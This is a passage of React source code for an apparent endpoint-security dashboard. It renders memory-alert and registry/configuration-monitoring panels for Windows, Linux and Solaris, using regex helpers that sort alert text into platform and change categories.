                    const sub = isReal
                      ? `${rp && rp !== 'unknown' ? rp : (a.ruleId || 'memory')}${a.pid ? ` · PID ${a.pid}` : ''} · ${rhost}`
                      : (mockS || `${rhost} memory event`);
                    const ts = a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : times[i];
                    return (
                      <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '20px 1fr auto', gap: 7, alignItems: 'flex-start' }}>
                        <span style={{ width: 18, height: 18, borderRadius: 9, display: 'grid', placeItems: 'center', color, background: `${color}20`, border: `1px solid ${color}38`, fontSize: 9, marginTop: 1 }}>!</span>
                        <span style={{ minWidth: 0 }}>
                          <b style={{ display: 'block', color, fontSize: 10, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{title}</b>
                          <span style={{ display: 'block', color: MON.muted, fontSize: 9, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{sub}</span>
                        </span>
                        <span style={{ textAlign: 'right', flexShrink: 0 }}>
                          {smallBadge(sev, color)}
                          <div style={{ color: MON.muted, fontSize: 9, marginTop: 3 }}>{ts}</div>
                        </span>
                      </div>
                    );
                  });
                })()}
                <div onClick={() => navigate('/edr-dashboard-details/memory/alerts')} style={{ textAlign: 'center', color: MON.cyan, fontSize: 10, fontWeight: 800, cursor: 'pointer', paddingTop: 4 }}>View All Alerts →</div>
              </div>
            </MonitorPanel>
          </div>

          <MonitorPanel title="MEMORY ACTIVITY MONITORING - ALL CATEGORIES">
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: 6, padding: '8px 10px' }}>
              {categoryRows.map((c, i) => {
                const icons = ['⚡', '✕', '⟳', '◈', '⊘', '▼', '⬡', '⚠', '◉', '▣', '↯', '❯_', '⟨⟩', '⊛', '◎', '↔', '⊕', '⬢', '✕', '⊞', '⌁', '⚙', '▤', '⊿', '◆'];
                const icon = icons[i % icons.length];
                return (
                  <div key={c.label} style={{ minHeight: 46, background: 'linear-gradient(135deg, rgba(13,28,56,.98), rgba(6,14,26,.98))', border: `1px solid ${c.color}28`, borderRadius: 6, padding: '6px 8px', display: 'flex', gap: 7, alignItems: 'center' }}>
                    <span style={{ width: 22, height: 22, borderRadius: 5, display: 'grid', placeItems: 'center', color: c.color, background: `${c.color}18`, border: `1px solid ${c.color}40`, fontSize: 9, flexShrink: 0 }}>{icon}</span>
                    <span style={{ minWidth: 0 }}>
                      <b style={{ display: 'block', color: c.color, fontSize: 9, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{c.label}</b>
                      <span style={{ color: MON.text, fontSize: 12, fontWeight: 900 }}>{c.value}</span>
                    </span>
                  </div>
                );
              })}
            </div>
          </MonitorPanel>

          <div style={{ display: 'grid', gridTemplateColumns: '1.38fr 1fr .95fr', gap: 8 }}>
            <MonitorPanel title="MEMORY USAGE TIMELINE (LAST 1 HOUR)">
              <div style={{ padding: '10px 14px' }}>
                <div style={{ display: 'flex', gap: 16, marginBottom: 8 }}>
                  {[{ label: 'Total Memory (GB)', color: MON.blue }, { label: 'Used Memory (GB)', color: MON.purple }].map(l => (
                    <span key={l.label} style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 9, color: MON.muted }}>
                      <span style={{ width: 18, height: 2, background: l.color, display: 'inline-block', borderRadius: 2 }} />{l.label}
                    </span>
                  ))}
                </div>
                <div style={{ height: 160, backgroundImage: 'linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px)', backgroundSize: '60px 40px', position: 'relative' }}>
                  {monitorSpark(timeline.map(v => v + 18), MON.blue, 'rgba(20,133,255,.18)', 74)}
                  <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0 }}>
                    {monitorSpark(timeline.map(v => Math.max(4, v * .58)), MON.purple, 'rgba(139,92,246,.15)', 74)}
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 6 }}>
                  {['14:00', '14:10', '14:20', '14:30', '14:40', '14:50', '15:00'].map(t => (
                    <span key={t} style={{ fontSize: 8, color: MON.muted }}>{t}</span>
                  ))}
                </div>
                <div style={{ display: 'flex', gap: 6, marginTop: 8, flexWrap: 'wrap' }}>
                  {[{ label: 'Critical', color: MON.red }, { label: 'High', color: MON.orange }, { label: 'Medium', color: MON.yellow }, { label: 'Low', color: MON.green }].map(l => (
                    <span key={l.label} style={{ display: 'flex', alignItems: 'center', gap: 4, fontSize: 9, color: MON.muted }}>
                      <span style={{ width: 8, height: 8, borderRadius: '50%', background: l.color, display: 'inline-block' }} />{l.label}
                    </span>
                  ))}
                </div>
              </div>
            </MonitorPanel>

            <MonitorPanel title="ENDPOINT MEMORY RISK MAP">
              <div style={{ padding: '8px 10px', position: 'relative' }}>
                <svg viewBox="0 0 500 280" width="100%" style={{ display: 'block', opacity: 0.85 }}>
                  {/* World map background paths (simplified continents) */}
                  <rect width="500" height="280" fill={MON.bg} rx="4" />
                  {/* North America */}
                  <path d="M60,40 L130,35 L155,55 L160,90 L145,110 L120,125 L100,140 L80,135 L65,115 L55,90 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.5" />
                  <path d="M65,115 L80,135 L90,155 L85,170 L75,165 L60,145 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.4" />
                  {/* South America */}
                  <path d="M120,160 L145,155 L155,175 L160,205 L155,235 L140,250 L125,245 L115,225 L110,200 L112,175 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.5" />
                  {/* Europe */}
                  <path d="M220,30 L260,25 L275,40 L270,65 L250,75 L230,70 L215,55 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.5" />
                  {/* Africa */}
                  <path d="M225,85 L265,80 L280,100 L285,140 L280,175 L260,195 L240,190 L220,165 L215,130 L218,100 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.5" />
                  {/* Asia */}
                  <path d="M275,25 L380,20 L420,35 L430,55 L415,80 L390,95 L360,100 L320,90 L290,75 L275,55 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.5" />
                  {/* Australia */}
                  <path d="M380,165 L425,160 L440,180 L435,205 L415,215 L390,210 L375,195 Z" fill="none" stroke={MON.border} strokeWidth="1" opacity="0.4" />
                  {/* Endpoint dots - Critical (red) */}
                  {[
                    [105, 80], [118, 105], [88, 90], [130, 65],
                  ].map(([x, y], i) => (
                    <g key={`c${i}`}>
                      <circle cx={x} cy={y} r="7" fill={MON.red} opacity="0.15" />
                      <circle cx={x} cy={y} r="4" fill={MON.red} opacity="0.4" />
                      <circle cx={x} cy={y} r="2.5" fill={MON.red} />
                    </g>
                  ))}
                  {/* High (orange) */}
                  {[
                    [240, 45], [255, 55], [310, 50], [340, 60], [148, 170],
                  ].map(([x, y], i) => (
                    <g key={`h${i}`}>
                      <circle cx={x} cy={y} r="6" fill={MON.orange} opacity="0.15" />
                      <circle cx={x} cy={y} r="3.5" fill={MON.orange} opacity="0.4" />
                      <circle cx={x} cy={y} r="2" fill={MON.orange} />
                    </g>
                  ))}
                  {/* Medium (yellow) */}
                  {[
                    [370, 55], [395, 65], [250, 130], [130, 190], [405, 185],
                  ].map(([x, y], i) => (
                    <g key={`m${i}`}>
                      <circle cx={x} cy={y} r="5" fill={MON.yellow} opacity="0.15" />
                      <circle cx={x} cy={y} r="3" fill={MON.yellow} opacity="0.4" />
                      <circle cx={x} cy={y} r="1.8" fill={MON.yellow} />
                    </g>
                  ))}
                  {/* Low (green) */}
                  {[
                    [280, 45], [420, 50], [350, 85], [410, 185],
                  ].map(([x, y], i) => (
                    <g key={`l${i}`}>
                      <circle cx={x} cy={y} r="4" fill={MON.green} opacity="0.15" />
                      <circle cx={x} cy={y} r="2.5" fill={MON.green} opacity="0.4" />
                      <circle cx={x} cy={y} r="1.5" fill={MON.green} />
                    </g>
                  ))}
                </svg>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px 14px', marginTop: 8, padding: '0 2px' }}>
                  {[
                    { label: 'Critical', value: critical, color: MON.red },
                    { label: 'High', value: high, color: MON.orange },
                    { label: 'Medium', value: medium, color: MON.yellow },
                    { label: 'Low', value: low, color: MON.green },
                    { label: 'Healthy', value: Math.max(100, systems - critical - high - medium), color: MON.cyan },
                  ].map(r => (
                    <div key={r.label} style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 10 }}>
                      <span style={{ width: 8, height: 8, borderRadius: '50%', background: r.color, flexShrink: 0 }} />
                      <span style={{ color: MON.muted }}>{r.label}</span>
                      <b style={{ color: MON.text, marginLeft: 3 }}>{r.value}</b>
                    </div>
                  ))}
                </div>
              </div>
            </MonitorPanel>

            <MonitorPanel title="TOP ENDPOINTS BY MEMORY USAGE" right={<span style={{ color: MON.muted }}>×</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 86px 1fr 36px 46px', gap: 6, padding: '9px 12px', color: MON.muted, fontSize: 9, fontWeight: 900 }}>
                {['Endpoint', 'IP Address', 'Memory Usage', '%', 'Risk'].map(h => <span key={h}>{h}</span>)}
              </div>
              {endpoints.map(e => {
                const color = e.risk === 'High' ? MON.red : e.risk === 'Medium' ? MON.yellow : MON.green;
                return (
                  <div key={e.endpoint} style={{ display: 'grid', gridTemplateColumns: '1fr 86px 1fr 36px 46px', gap: 6, alignItems: 'center', padding: '7px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10 }}>
                    <b style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{e.endpoint}</b>
                    <span style={{ color: MON.muted, fontSize: 9 }}>{e.ip}</span>
                    <span style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      <span style={{ color: MON.text, whiteSpace: 'nowrap', minWidth: 38 }}>{e.memory}</span>
                      <span style={{ flex: 1, height: 6, borderRadius: 4, background: MON.line, overflow: 'hidden' }}>
                        <span style={{ display: 'block', height: '100%', width: `${e.pct}%`, background: color, borderRadius: 4 }} />
                      </span>
                    </span>
                    <span style={{ color: MON.muted, fontSize: 9 }}>{e.pct}%</span>
                    <span style={{ color, fontWeight: 900 }}>{e.risk}</span>
                  </div>
                );
              })}
              <div onClick={() => navigate('/edr-dashboard-details/memory/agents')} style={{ padding: '9px 12px', textAlign: 'center', color: MON.cyan, fontSize: 10, fontWeight: 800, cursor: 'pointer' }}>View All Endpoints →</div>
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend memory events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function registryPlatform(alert = {}, index = 0) {
  const raw = alert.rawEvent?.raw && typeof alert.rawEvent.raw === 'object' ? alert.rawEvent.raw : {};
  const text = `${alert.platform || ''} ${alert.osType || ''} ${alert.os || ''} ${alert.hostname || ''} ${alert.agentName || ''} ${alert.systemId?.name || ''} ${alert.keyPath || ''} ${alert.registryKey || ''} ${alert.filePath || ''} ${alert.sourcePath || ''} ${alert.description || ''} ${alert.rawEvent?.platform || ''} ${alert.rawEvent?.os || ''} ${alert.rawEvent?.osType || ''} ${alert.rawEvent?.file_path || ''} ${raw.platform || ''} ${raw.os || ''} ${raw.osType || ''}`.toLowerCase();
  if (/linux|ubuntu|debian|centos|rhel|ssh|cron|systemd|sudo|etc\//.test(text)) return 'Linux';
  if (/solaris|zfs|svc|svr4|zone|pkg/.test(text)) return 'Solaris';
  if (/windows|\bwin(?:32|64|10|11)?\b|hklm|hkcu|hkey_|defender|powershell/.test(text)) return 'Windows';
  return 'Unknown';
}

function registryChangeType(alert = {}, index = 0) {
  const text = `${alert.eventType || ''} ${alert.action || ''} ${alert.fileAction || ''} ${alert.ruleId || ''} ${alert.description || ''}`.toLowerCase();
  if (/delete|deleted|remove|removed/.test(text)) return /user|account/.test(text) ? 'User Deleted' : 'File / Key Deleted';
  if (/create|created|added|new entry/.test(text)) return /user|account/.test(text) ? 'User Created' : 'File / Key Created';
  if (/run key|startup|persistence/.test(text)) return 'Registry Modified';
  if (/user|admin|account/.test(text)) return 'User / Account Changed';
  if (/firewall|defender|security/.test(text)) return 'Security Setting';
  if (/cron|scheduled/.test(text)) return 'Cron Job Added';
  if (/ssh|config|file|modified|write/.test(text)) return 'File / Config Modified';
  if (/service|systemd|svc/.test(text)) return 'Service Stopped';
  if (/zfs|pool/.test(text)) return 'ZFS Pool Exported';
  return 'Observed';
}

// 🛡️ 6. Registry Monitoring popup UI
function RegistryMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const rows = sorted.filter(row => !row._registrySupport);
  const severityOf = row => String(row?.severity || 'low').trim().toLowerCase();
  const critical = rows.filter(a => severityOf(a) === 'critical').length;
  const high = rows.filter(a => severityOf(a) === 'high').length;
  const medium = rows.filter(a => severityOf(a) === 'medium').length;
  const low = rows.filter(a => severityOf(a) === 'low').length;
  const systemName = row => row.agentName || row.hostname || row.systemId?.name || row.endpointId || row.agentId || '';
  const systems = new Set(rows.map(systemName).filter(Boolean)).size;
  const totalAlerts = rows.length;
  const series = hourlySeriesFromAlerts(rows);
  const trend = series;
  const severityTrends = {
    critical: hourlySeriesFromAlerts(rows.filter(row => severityOf(row) === 'critical')),
    high: hourlySeriesFromAlerts(rows.filter(row => severityOf(row) === 'high')),
    medium: hourlySeriesFromAlerts(rows.filter(row => severityOf(row) === 'medium')),
    low: hourlySeriesFromAlerts(rows.filter(row => severityOf(row) === 'low')),
  };
  const sevColor = (sev) => memorySeverityColor(sev);
  const registryEventText = (row = {}) => `${row.ruleId || ''} ${row.category || ''} ${row.subCategory || ''} ${row.eventType || ''} ${row.description || ''} ${row.details || ''} ${row.action || ''} ${row.keyPath || ''} ${row.registryKey || ''} ${row.filePath || ''} ${row.sourcePath || ''} ${row.rawEvent?.message || ''} ${row.rawEvent?.type || ''} ${row.rawEvent?.key || ''}`.toLowerCase();
  const registryUser = (row = {}) => {
    const raw = row.rawEvent?.raw && typeof row.rawEvent.raw === 'object' ? row.rawEvent.raw : {};
    return row.username
      || row.user
      || row.fileUser
      || row.changedByUser
      || row.changed_by_user
      || row.rawEvent?.username
      || row.rawEvent?.user
      || row.rawEvent?.fileUser
      || row.rawEvent?.file_user
      || row.rawEvent?.changedByUser
      || row.rawEvent?.changed_by_user
      || raw.username
      || raw.user
      || raw.fileUser
      || raw.file_user
      || raw.changedByUser
      || raw.changed_by_user
      || row.agentName
      || row.hostname
      || '-';
  };
  const classifyPlatformGroup = (platform, row) => {
    const text = registryEventText(row);
    if (platform === 'Windows') {
      if (/runonce|run key|startup|persistence|scheduled task|wmi subscription|winlogon|userinit/.test(text)) return 'Startup / Persistence';
      if (/defender|antivirus|firewall|uac|security center|audit policy|applocker|exploit guard|security config|unauthorized|threat|malware/.test(text)) return 'Security Configuration';
      if (/user|account|admin group|password policy|authentication|auth_|login|logon|rdp|lsa|auth package/.test(text)) return 'User & Authentication';
      if (/network|dns|proxy|hosts file|adapter|smb|remote access|vpn/.test(text)) return 'Network Configuration';
      if (/software|install|uninstall|powershell|script host|file association|msi|execution|proc_|process|cpu|memory/.test(text)) return 'Software & Execution';
      return 'Logging / System';
    }
    if (platform === 'Linux') {
      if (/user|account|password|group|sudoers|ssh key|auth_|authentication|login|logout|logon/.test(text)) return 'User Monitoring';
      if (/cron|systemd|init\.d|startup|bash profile|ld_preload|persistence/.test(text)) return 'Persistence Monitoring';
      if (/firewall|selinux|apparmor|auditd|pam|ssh config|security|unauthorized|threat|malware|exposure/.test(text)) return 'Security Monitoring';
      if (/network|dns|hosts file|interface|routing|route|proxy|vpn|listening port/.test(text)) return 'Network Monitoring';
      if (/package|kernel module|binary replacement|software|compiler|install|remove|proc_|process|cpu|memory|execution/.test(text)) return 'Software Monitoring';
      return 'File Integrity Monitoring';
    }
    if (/user|account|role|rbac|password|privilege|auth_|login|logout/.test(text)) return 'User Monitoring';
    if (/smf|svcadm|svcs|svc:\/|service|startup config/.test(text)) return 'Service Monitoring';
    if (/audit|pam|ssh|trusted extension|login banner|security|unauthorized|threat|malware/.test(text)) return 'Security Monitoring';
    if (/network|interface|dns|routing|route|firewall|proxy/.test(text)) return 'Network Monitoring';
    if (/zfs|filesystem|mount|permission|disk|storage|file/.test(text)) return 'Filesystem Monitoring';
    return 'Process Monitoring';
  };
  const groupStats = (platform, name) => {
    const matchingRows = rows.filter(row => registryPlatform(row) === platform && classifyPlatformGroup(platform, row) === name);
    return {
      total: matchingRows.length,
      critical: matchingRows.filter(row => severityOf(row) === 'critical').length,
      warning: matchingRows.filter(row => /^(high|medium|warning)$/.test(severityOf(row))).length,
      info: matchingRows.filter(row => !/^(critical|high|medium|warning)$/.test(severityOf(row))).length,
    };
  };
  const offline = 0;
  const platformPanels = [
    {
      title: 'WINDOWS REGISTRY MONITORING',
      icon: '⊞',
      color: MON.blue,
      groups: [
        ['Startup / Persistence', 32, ['Run / RunOnce Keys', 'Scheduled Tasks', 'Services', 'WMI Subscriptions', 'Winlogon / Userinit']],
        ['Security Configuration', 28, ['Defender / AV Changes', 'Firewall Changes', 'UAC / Security Center', 'Audit Policy Changes', 'AppLocker / Exploit Guard']],
        ['User & Authentication', 26, ['User Account Changes', 'Admin Group Changes', 'Password Policy', 'RDP Enable/Disable', 'LSA / Auth Package']],
        ['Network Configuration', 18, ['DNS / Proxy Changes', 'Hosts File Changes', 'Network Adapter Changes', 'SMB / Remote Access', 'VPN Configuration']],
        ['Software & Execution', 21, ['Software Install/Uninstall', 'PowerShell Policy Changes', 'Script Host Changes', 'File Association Changes', 'MSI Package Install']],
        ['Logging / System', 12, ['Event Logs Cleared', 'Logging Disabled', 'System Disabled', 'Security Log Tampering']],
      ],
    },
    {
      title: 'LINUX CONFIGURATION MONITORING',
      icon: '♟',
      color: MON.green,
      groups: [
        ['User Monitoring', 31, ['User Creation / Deletion', 'Password Changes', 'Group Changes', 'Sudoers Changes', 'SSH Key Activities']],
        ['Persistence Monitoring', 26, ['Cron Jobs Changes', 'Systemd Service Changes', 'Init.d / Startup Scripts', 'Bash Profile Changes', 'LD_PRELOAD / Backdoor']],
        ['Security Monitoring', 12, ['Firewall Changes', 'SELinux / AppArmor', 'Auditd Changes', 'PAM Changes', 'SSH Config Changes']],
        ['Network Monitoring', 16, ['DNS / Hosts Changes', 'Network Interface Changes', 'Routing Table Changes', 'Proxy / VPN Changes', 'Listening Port Changes']],
        ['Software Monitoring', 20, ['Package Install/Remove', 'Kernel Module Loading', 'Binary Replacement', 'Unauthorized Software', 'Compiler Install']],
        ['File Integrity Monitoring', 14, ['Critical File Changes', 'Permission Changes', 'Ownership Changes', 'Log Deletion', 'Config File Tampering']],
      ],
    },
    {
      title: 'SOLARIS MONITORING',
      icon: '☼',
      color: MON.purple,
      groups: [
        ['User Monitoring', 14, ['User Add / Delete', 'Role Changes', 'RBAC Changes', 'Password Changes', 'Privilege Changes']],
        ['Service Monitoring', 12, ['SMF Service Changes', 'Service Enable/Disable', 'Service Failures', 'Startup Config Changes']],
        ['Security Monitoring', 10, ['Audit Policy Changes', 'PAM / SSH Changes', 'Trusted Extensions', 'Login Banner Changes']],
        ['Network Monitoring', 8, ['Interface Changes', 'DNS Changes', 'Routing Changes', 'Firewall Changes', 'Proxy Changes']],
        ['Filesystem Monitoring', 9, ['ZFS Configuration', 'Mount Point Changes', 'Permission Changes', 'Disk / Storage Changes']],
        ['Process Monitoring', 0, ['Process Execution', 'Shell Activity', 'Daemon Changes', 'Binary Replacement']],
      ],
    },
  ];
  const classifyAlertCategory = row => {
    const text = registryEventText(row);
    if (/runonce|run key|startup|persistence|scheduled|cron|systemd|winlogon|ld_preload/.test(text)) return 'Persistence Changes';
    if (/user|account|admin|group|password|sudoers|rbac|role|privilege/.test(text)) return 'User Changes';
    if (/net_|network|dns|proxy|adapter|interface|route|smb|vpn|port|connection|exposure/.test(text)) return 'Network Changes';
    if (/security|defender|firewall|uac|audit|selinux|apparmor|pam|applocker|unauthorized|threat|malware|suspicious|policy violation/.test(text)) return 'Security Changes';
    if (/service|smf|svcadm|svcs|svc:\//.test(text)) return 'Service Changes';
    if (/file|integrity|hash|permission|ownership|zfs|mount|tamper/.test(text)) return 'File Integrity';
    return 'Other Changes';
  };
  const categoryDefinitions = [
    ['Persistence Changes', MON.red],
    ['User Changes', MON.orange],
    ['Security Changes', MON.yellow],
    ['Network Changes', MON.green],
    ['Service Changes', MON.blue],
    ['File Integrity', MON.purple],
    ['Other Changes', '#94a3b8'],
  ];
  const categories = categoryDefinitions.map(([label, color]) => [
    label,
    rows.filter(row => classifyAlertCategory(row) === label).length,
    color,
  ]);
  const categoryTotal = categories.reduce((sum, [, value]) => sum + value, 0);
  let categoryAngle = 0;
  const categorySegments = categories.map(([, value, color]) => {
    const start = categoryAngle;
    categoryAngle += categoryTotal ? (value / categoryTotal) * 360 : 0;
    return `${color} ${start}deg ${categoryAngle}deg`;
  });
  const categoryDonutBackground = categoryTotal
    ? `conic-gradient(${categorySegments.join(', ')})`
    : MON.line;
  const affected = groupCounts(rows, a => a.agentName || a.systemId?.name || 'Unknown', 8)
    .map(r => {
      const systemRows = rows.filter(row => (row.agentName || row.systemId?.name || 'Unknown') === r.label);
      const severity = systemRows.some(row => row.severity === 'critical') ? 'Critical'
        : systemRows.some(row => row.severity === 'high') ? 'High'
          : systemRows.some(row => row.severity === 'medium') ? 'Medium' : 'Low';
      return { system: r.label, os: registryPlatform(systemRows[0] || {}), alerts: r.value, severity };
    });
  const registryOnlyRows = rows;
  const recentRows = registryOnlyRows.slice(0, 12);
  const recentCriticalRows = registryOnlyRows
    .filter(row => /^(critical|high)$/i.test(String(row.severity || '')))
    .slice(0, 8);
  const kpis = [
    ['TOTAL ALERTS', shortNum(totalAlerts), totalAlerts ? 'Live registry events' : '0', MON.red, trend],
    ['CRITICAL', shortNum(critical), critical ? 'Live critical events' : '0', MON.red, trend.slice(-12)],
    ['HIGH', shortNum(high), high ? 'Live high-risk events' : '0', MON.orange, trend.slice(2, 14)],
    ['MEDIUM', shortNum(medium), medium ? 'Live medium-risk events' : '0', MON.yellow, trend.slice(5, 17)],
    ['LOW', shortNum(low), low ? 'Live low-risk events' : '0', MON.green, trend.slice(8, 20)],
    ['TOTAL SYSTEMS', shortNum(systems), `Online ${systems}  Offline ${offline}`, MON.blue, []],
  ];

  return (
    <SocDashboardShell kind="registry" active="Registry Monitoring">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1000, display: 'grid', gap: 8 }}>
          <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'center' }}>
            <RegistryCapabilityActions />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.1fr .9fr .9fr .9fr .9fr 1.15fr', gap: 8 }}>
            {kpis.map(([title, value, sub, color, data], i) => (
              <section key={title} style={{ minHeight: 84, border: `1px solid ${MON.border}`, borderRadius: 7, background: `linear-gradient(135deg, ${color}12, rgba(9,20,36,.98) 42%, rgba(6,13,24,.98))`, padding: 12, display: 'grid', gridTemplateColumns: i === 5 ? '1fr 36px' : '1fr 82px', gap: 8, alignItems: 'center', overflow: 'hidden' }}>
                <span>
                  <div style={{ color: '#c8d7ea', fontSize: 10, fontWeight: 900 }}>{title}</div>
                  <strong style={{ display: 'block', color: MON.text, fontSize: 24, lineHeight: 1, marginTop: 8 }}>{value}</strong>
                  <span style={{ color, fontSize: 10, fontWeight: 800, whiteSpace: 'pre' }}>{sub}</span>
                </span>
                {data.length ? monitorSpark(data, color, `${color}16`, 38) : <span style={{ width: 34, height: 34, borderRadius: 5, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35`, fontSize: 20 }}>▤</span>}
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.1fr 1.1fr 1fr', gap: 8 }}>
            {platformPanels.map(panel => {
              const platform = panel.title.startsWith('WINDOWS') ? 'Windows' : panel.title.startsWith('LINUX') ? 'Linux' : 'Solaris';
              const platformTotal = rows.filter(row => registryPlatform(row) === platform).length;
              return (
                <MonitorPanel
                  key={panel.title}
                  title={<span style={{ display: 'flex', alignItems: 'center', gap: 7 }}><b style={{ color: panel.color, fontSize: 16 }}>{panel.icon}</b>{panel.title}</span>}
                  right={<span style={{ minWidth: 20, textAlign: 'center', color: '#fff', background: panel.color, borderRadius: 3, padding: '2px 6px', fontSize: 9, fontWeight: 950 }}>{platformTotal}</span>}
                >
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 5, padding: 7 }}>
                    {panel.groups.map(([name]) => {
                      const stats = groupStats(platform, name);
                      const criticalEnd = stats.total ? (stats.critical / stats.total) * 360 : 0;
                      const warningEnd = stats.total ? criticalEnd + ((stats.warning / stats.total) * 360) : 0;
                      const donutBackground = stats.total
                        ? `conic-gradient(${MON.red} 0deg ${criticalEnd}deg, ${MON.orange} ${criticalEnd}deg ${warningEnd}deg, ${MON.blue} ${warningEnd}deg 360deg)`
                        : MON.line;
                      return (
                        <div key={name} style={{ minHeight: 67, border: `1px solid ${MON.line}`, borderRadius: 6, padding: '7px 8px', background: 'linear-gradient(135deg,rgba(13,31,57,.92),rgba(8,20,39,.96))' }}>
                          <b title={name} style={{ display: 'block', color: MON.text, fontSize: 9, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginBottom: 5 }}>{name}</b>
                          <div style={{ display: 'grid', gridTemplateColumns: '48px minmax(0,1fr)', gap: 9, alignItems: 'center' }}>
                            <div style={{ width: 44, height: 44, borderRadius: '50%', background: donutBackground, display: 'grid', placeItems: 'center', boxShadow: stats.total ? `0 0 12px ${panel.color}22` : 'none' }}>
                              <div style={{ width: 29, height: 29, borderRadius: '50%', background: '#09182c', border: `1px solid ${MON.line}`, display: 'grid', placeItems: 'center', color: '#f8fbff', fontSize: 11, fontWeight: 950 }}>{stats.total}</div>
                            </div>
                            <div style={{ display: 'grid', gap: 3, minWidth: 0 }}>
                              {[
                                ['Critical', stats.critical, MON.red],
                                ['Warning', stats.warning, MON.orange],
                                ['Info', stats.info, MON.blue],
                              ].map(([label, value, color]) => (
                                <div key={label} style={{ display: 'grid', gridTemplateColumns: '7px minmax(0,1fr) auto', gap: 5, alignItems: 'center', color: '#cbd5e1', fontSize: 8 }}>
                                  <span style={{ width: 6, height: 6, background: color }} />
                                  <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{label}</span>
                                  <b style={{ color: '#e5edf7', fontSize: 8 }}>{value}</b>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </MonitorPanel>
              );
            })}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.45fr 1.08fr .72fr', gap: 8 }}>
            <MonitorPanel title="ALERTS OVER TIME">
              <ModernAlertTrendChart
                total={trend}
                critical={severityTrends.critical}
                high={severityTrends.high}
                medium={severityTrends.medium}
                low={severityTrends.low}
              />
            </MonitorPanel>
            <MonitorPanel title="TOP ALERT CATEGORIES">
              <div style={{ display: 'grid', gridTemplateColumns: '122px minmax(0, 1fr)', alignItems: 'center', padding: 12, gap: 10, minWidth: 0, overflow: 'hidden' }}>
                <div style={{ width: 112, height: 112, borderRadius: '50%', margin: '0 auto', background: categoryDonutBackground, display: 'grid', placeItems: 'center', flexShrink: 0 }}>
                  <div style={{ width: 62, height: 62, borderRadius: '50%', background: MON.card, border: `1px solid ${MON.line}`, display: 'grid', placeItems: 'center', color: MON.muted, fontSize: 8 }}>
                    {shortNum(categoryTotal)}
                  </div>
                </div>
                <div style={{ display: 'grid', gap: 8, minWidth: 0, overflow: 'hidden' }}>
                  {categories.map(([label, value, color]) => {
                    const max = Math.max(...categories.map(([, v]) => v), 1);
                    const percent = pct(value, categoryTotal).replace('%', '');
                    return (
                      <div key={label} style={{ display: 'grid', gap: 4, minWidth: 0 }}>
                        <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0, 1fr) auto', gap: 8, alignItems: 'center', minWidth: 0 }}>
                          <span title={label} style={{ color: MON.text, fontSize: 9, fontWeight: 850, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', minWidth: 0 }}>{label}</span>
                          <b style={{ color: MON.text, fontSize: 9, textAlign: 'right', whiteSpace: 'nowrap' }}>{value} · {percent}%</b>
                        </div>
                        <span style={{ height: 6, borderRadius: 6, background: MON.line, overflow: 'hidden', minWidth: 0 }}>
                          <span style={{ display: 'block', height: '100%', width: `${(value / max) * 100}%`, background: color, borderRadius: 7 }} />
                        </span>
                      </div>
                    );
                  })}
                </div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="TOP AFFECTED SYSTEMS">
              <div style={{ display: 'grid', gridTemplateColumns: 'minmax(84px, 1fr) 24px 36px 46px', gap: 6, color: MON.muted, fontSize: 8, fontWeight: 900, padding: '9px 10px' }}>{['SYSTEM', 'OS', 'ALERTS', 'SEV'].map(h => <span key={h}>{h}</span>)}</div>
              {affected.slice(0, 8).map((s, i) => {
                const color = s.severity === 'Critical' ? MON.red : s.severity === 'High' ? MON.orange : MON.yellow;
